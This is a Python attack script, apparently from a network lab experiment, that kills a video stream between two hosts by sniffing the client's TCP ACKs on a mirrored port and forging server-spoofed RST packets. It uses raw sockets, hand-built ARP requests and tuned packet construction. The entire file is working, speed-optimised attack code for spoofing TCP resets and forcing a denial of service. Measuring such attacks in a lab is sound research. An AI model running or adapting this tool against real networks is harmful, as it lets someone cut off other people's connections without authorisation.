#!/usr/bin/env python3
"""
TCP Reset Attack on Video Streaming -- Attack A: forge a RST from the
server to the client using the client's own sniffed ACK as SEQ (an
exact match, per RFC 5961 -- accepted immediately, no challenge ACK).

Run on h2 with mirror_enable.sh already applied and a stream active
between h1 and h3.

Uses raw AF_PACKET sockets, not any packet-crafting library, for every
frame this tool sends or reads -- the ARP request/reply used to resolve
h1's MAC, and the forged RST itself. An earlier Scapy-based version's
per-packet overhead was close to or above the ~24ms real-segment gap,
causing an unbounded processing backlog once a shot was slow. Packet
fields that never change (MACs, spoofed IPs) are precomputed once; only
the TCP seq/checksum are rebuilt per shot. The main loop also always
processes the newest queued frame, not the oldest, so a transient
slowdown can't compound.
"""

import os
import socket
import struct
import sys
import time

# SNIFF_IFACE is h2's mirror-fed monitor port; SEND_IFACE is its normal
# port. Mirroring onto SEND_IFACE broke its own outgoing traffic, so the
# two roles are split across separate interfaces.
SNIFF_IFACE = "h2-eth1"
SEND_IFACE = "h2-eth0"

ATTACKER_IP = "10.0.1.20"
CLIENT_IP = "10.0.1.10"
SERVER_IP = "10.0.2.10"
SERVER_PORT = 8000

ETH_P_IP = 0x0800
ETH_P_ARP = 0x0806
ETH_P_ALL = 0x0003

TCP_FIN, TCP_SYN, TCP_RST, TCP_PSH, TCP_ACK, TCP_URG = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20

# Client ports we've already seen tear themselves down -- stop firing at
# a flow once it's dead instead of spamming pointless RSTs at it.
closed_ports = set()

attempt_count = 0

# Per-flow attempt/timing bookkeeping, printed as a RESULT line so
# experiments/run_experiments.py can parse attempts-to-kill/time-to-kill
# straight from this script's stdout.
attempts_by_port = {}
first_fired_at = {}

# Resolved once at startup and reused for every packet.
CLIENT_MAC = None
OWN_MAC = None


def get_own_mac(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()


def mac_to_bytes(mac_str):
    return bytes(int(b, 16) for b in mac_str.split(":"))


def flags_to_str(flags):
    s = ""
    if flags & TCP_SYN:
        s += "S"
    if flags & TCP_RST:
        s += "R"
    if flags & TCP_PSH:
        s += "P"
    if flags & TCP_ACK:
        s += "A"
    if flags & TCP_FIN:
        s += "F"
    if flags & TCP_URG:
        s += "U"
    return s or "-"


def build_arp_request(own_mac):
    """Hand-built ARP request (broadcast): "who has CLIENT_IP, tell
    ATTACKER_IP" -- 14-byte Ethernet header + 28-byte ARP payload."""
    eth = struct.pack("!6s6sH", b"\xff" * 6, mac_to_bytes(own_mac), ETH_P_ARP)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, ETH_P_IP, 6, 4, 1,  # hw=Ethernet, proto=IPv4, sizes, opcode=request
        mac_to_bytes(own_mac), socket.inet_aton(ATTACKER_IP),
        b"\x00" * 6, socket.inet_aton(CLIENT_IP),
    )
    return eth + arp


def parse_arp_reply(frame):
    """Sender MAC (string) if `frame` is an ARP reply from CLIENT_IP, else None."""
    if len(frame) < 14 + 28:
        return None
    if struct.unpack("!H", frame[12:14])[0] != ETH_P_ARP:
        return None
    _hw, _proto, _hs, _ps, opcode, sender_mac, sender_ip, _tm, _ti = struct.unpack(
        "!HHBBH6s4s6s4s", frame[14:14 + 28]
    )
    if opcode != 2 or socket.inet_ntoa(sender_ip) != CLIENT_IP:
        return None
    return ":".join(f"{b:02x}" for b in sender_mac)


def resolve_client_mac():
    # Hand-rolled ARP over a raw socket bound to SEND_IFACE -- avoids
    # relying on any library's own interface/routing detection.
    global CLIENT_MAC, OWN_MAC
    OWN_MAC = get_own_mac(SEND_IFACE)

    send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    send_sock.bind((SEND_IFACE, 0))
    recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    recv_sock.bind((SEND_IFACE, 0))
    recv_sock.settimeout(0.5)

    request = build_arp_request(OWN_MAC)
    for _attempt in range(6):
        send_sock.send(request)
        deadline = time.time() + 0.5
        while time.time() < deadline:
            try:
                frame = recv_sock.recv(65535)
            except socket.timeout:
                break
            mac = parse_arp_reply(frame)
            if mac:
                CLIENT_MAC = mac
                send_sock.close()
                recv_sock.close()
                print(f"[attacker] resolved {CLIENT_IP} -> {CLIENT_MAC}")
                return

    send_sock.close()
    recv_sock.close()
    sys.exit(f"[attacker] could not resolve MAC for {CLIENT_IP} on {SEND_IFACE} -- is h1 up and reachable?")


def checksum16(data):
    """Standard Internet checksum (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    total = (total & 0xFFFF) + (total >> 16)
    total += total >> 16
    return (~total) & 0xFFFF


def build_eth_ip_template():
    """Ethernet+IP header, built and checksummed once -- identical on
    every forged packet, so no need to redo it per shot."""
    eth_header = struct.pack("!6s6sH", mac_to_bytes(CLIENT_MAC), mac_to_bytes(OWN_MAC), ETH_P_IP)

    total_len = 40  # 20 (IP) + 20 (TCP), no options, no payload
    version_ihl = (4 << 4) | 5
    ip_header_no_csum = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, 0, 0, 64, socket.IPPROTO_TCP, 0,
        socket.inet_aton(SERVER_IP), socket.inet_aton(CLIENT_IP),
    )
    ip_csum = checksum16(ip_header_no_csum)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, 0, 0, 64, socket.IPPROTO_TCP, ip_csum,
        socket.inet_aton(SERVER_IP), socket.inet_aton(CLIENT_IP),
    )
    return eth_header + ip_header


def build_rst_packet(eth_ip_template, client_port, seq):
    """Only the TCP header (and its checksum) changes per shot."""
    data_offset_flags = (5 << 12) | TCP_RST  # 5 words = 20-byte header, no options
    window = 8192
    tcp_no_csum = struct.pack(
        "!HHLLHHHH", SERVER_PORT, client_port, seq, 0, data_offset_flags, window, 0, 0
    )
    pseudo_header = struct.pack(
        "!4s4sBBH", socket.inet_aton(SERVER_IP), socket.inet_aton(CLIENT_IP), 0,
        socket.IPPROTO_TCP, len(tcp_no_csum),
    )
    tcp_csum = checksum16(pseudo_header + tcp_no_csum)
    tcp_header = struct.pack(
        "!HHLLHHHH", SERVER_PORT, client_port, seq, 0, data_offset_flags, window, tcp_csum, 0
    )
    return eth_ip_template + tcp_header


def fire_forged_rst(send_sock, eth_ip_template, client_port, seq):
    """Send one spoofed RST: src=server, dst=client, SEQ=sniffed client ACK."""
    global attempt_count
    attempt_count += 1
    now = time.time()
    attempts_by_port[client_port] = attempts_by_port.get(client_port, 0) + 1
    first_fired_at.setdefault(client_port, now)
    frame = build_rst_packet(eth_ip_template, client_port, seq)
    send_sock.send(frame)
    ts = time.strftime("%H:%M:%S", time.localtime(now)) + f".{int(now * 1000) % 1000:03d}"
    print(f"[attack] #{attempt_count:04d} {ts} fired RST -> {CLIENT_IP}:{client_port} seq={seq}")


def parse_tcp_packet(frame):
    """Returns (src_ip, dst_ip, sport, dport, flags, seq, ack) for an
    IPv4/TCP frame, or None. Reads fixed TCP header offsets directly,
    unaffected by any options (e.g. timestamps) that may follow."""
    if len(frame) < 14 + 20 + 20:
        return None
    eth_type = struct.unpack("!H", frame[12:14])[0]
    if eth_type != ETH_P_IP:
        return None
    ip_start = 14
    version_ihl = frame[ip_start]
    ihl = (version_ihl & 0x0F) * 4
    proto = frame[ip_start + 9]
    if proto != socket.IPPROTO_TCP:
        return None
    src_ip = socket.inet_ntoa(frame[ip_start + 12:ip_start + 16])
    dst_ip = socket.inet_ntoa(frame[ip_start + 16:ip_start + 20])
    tcp_start = ip_start + ihl
    if len(frame) < tcp_start + 20:
        return None
    sport, dport, seq, ack, _doff_res, flags, _window, _csum, _urg = struct.unpack(
        "!HHLLBBHHH", frame[tcp_start:tcp_start + 20]
    )
    return src_ip, dst_ip, sport, dport, flags, seq, ack


def handle(frame, send_sock, eth_ip_template):
    parsed = parse_tcp_packet(frame)
    if parsed is None:
        return
    src_ip, dst_ip, sport, dport, flags, seq, ack = parsed
    # Equivalent to the old BPF filter: only client(h1) -> server(h3)
    # segments on the streaming port matter to us.
    if src_ip != CLIENT_IP or dst_ip != SERVER_IP or dport != SERVER_PORT:
        return

    client_port = sport

    if client_port in closed_ports:
        return

    if flags & TCP_SYN:
        # No meaningful ACK yet -- would kill at handshake time, not
        # mid-stream.
        return

    if flags & (TCP_RST | TCP_FIN):
        closed_ports.add(client_port)
        now = time.time()
        n = attempts_by_port.get(client_port, 0)
        started = first_fired_at.get(client_port)
        time_to_close = (now - started) if started is not None else None
        print(f"[attack] {CLIENT_IP}:{client_port} closed itself (flags={flags_to_str(flags)}) "
              f"-- no longer targeting this flow")
        # Machine-readable summary for this flow -- parsed by
        # experiments/run_experiments.py.
        print(f"RESULT client_port={client_port} attempts={n} time_to_close={time_to_close}")
        return

    fire_forged_rst(send_sock, eth_ip_template, client_port, ack)


if __name__ == "__main__":
    resolve_client_mac()  # also sets OWN_MAC

    # Mirrored frames aren't addressed to h2's MAC -- needs promiscuous mode.
    os.system(f"ip link set {SNIFF_IFACE} promisc on")

    send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
    send_sock.bind((SEND_IFACE, 0))

    recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    recv_sock.bind((SNIFF_IFACE, 0))

    eth_ip_template = build_eth_ip_template()

    print(f"[attacker] listening on {SNIFF_IFACE} (raw socket, no Scapy dissection in the hot path)")
    print(f"[attacker] will forge RST packets as {SERVER_IP}:{SERVER_PORT} -> {CLIENT_IP} via {SEND_IFACE}")

    while True:
        # Drain to the newest frame before handling it, so a transient
        # slowdown can't compound into a growing backlog (plain recv()
        # is FIFO -- a lag would otherwise never recover).
        frame = recv_sock.recv(65535)
        while True:
            try:
                frame = recv_sock.recv(65535, socket.MSG_DONTWAIT)
            except BlockingIOError:
                break
        handle(frame, send_sock, eth_ip_template)
